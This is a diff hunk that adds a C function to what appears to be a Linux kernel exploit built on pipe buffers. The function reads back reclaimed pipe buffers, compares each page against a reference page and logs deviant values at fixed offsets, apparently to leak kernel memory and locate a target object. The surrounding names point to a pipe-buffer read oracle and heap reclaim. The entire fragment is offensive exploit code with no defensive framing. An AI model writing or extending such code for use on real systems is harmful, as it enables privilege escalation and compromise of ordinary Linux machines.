@@ -977,6 +977,44 @@ int expand_p0_pipe_oracle(void) {
   return 1;
 }
 
+
+void p0_dump_gate_target(uintptr_t oracle_target) {
+  static unsigned char dump_buf[0x4200];
+  static unsigned char ref_page[0x900];
+  int ref_ok = 0;
+  int deviants = 0;
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    ssize_t n = read(pipe_fds_reclaim[i][0], dump_buf, 0x4200);
+    if (n < 0x1000) {
+      continue;
+    }
+    for (size_t page = 0; (page + 1) * 0x1000 <= (size_t)n; page++) {
+      unsigned char *cur = dump_buf + page * 0x1000;
+      if (!ref_ok) {
+        memcpy(ref_page, cur, 0x900);
+        ref_ok = 1;
+        pr_info("p0 target ref pipe=%zu page=%zu q800=%016llx\n",
+                i, page, *(uint64_t *)(ref_page + 0x800));
+        continue;
+      }
+      if (memcmp(ref_page + 0x7f0, cur + 0x7f0, 0x80) != 0) {
+        deviants++;
+        pr_info("p0 target DEVIANT pipe=%zu page=%zu q800=%016llx "
+                "q808=%016llx q810=%016llx q818=%016llx "
+                "q820=%016llx q828=%016llx q830=%016llx\n",
+                i, page,
+                *(uint64_t *)(cur + 0x800), *(uint64_t *)(cur + 0x808),
+                *(uint64_t *)(cur + 0x810), *(uint64_t *)(cur + 0x818),
+                *(uint64_t *)(cur + 0x820), *(uint64_t *)(cur + 0x828),
+                *(uint64_t *)(cur + 0x830));
+      }
+    }
+  }
+  pr_info("p0 target dump done pipes=%d deviants=%d "
+          "oracle_target=%016zx base=%016zx\n",
+          PIPE_RECLAIM, deviants, oracle_target, pipebuf_page_base);
+}
+
 int verify_p0_pipe_oracle_gate(void) {
   unsigned char page[PAGE_SIZE];
   int gate_hits = 0;
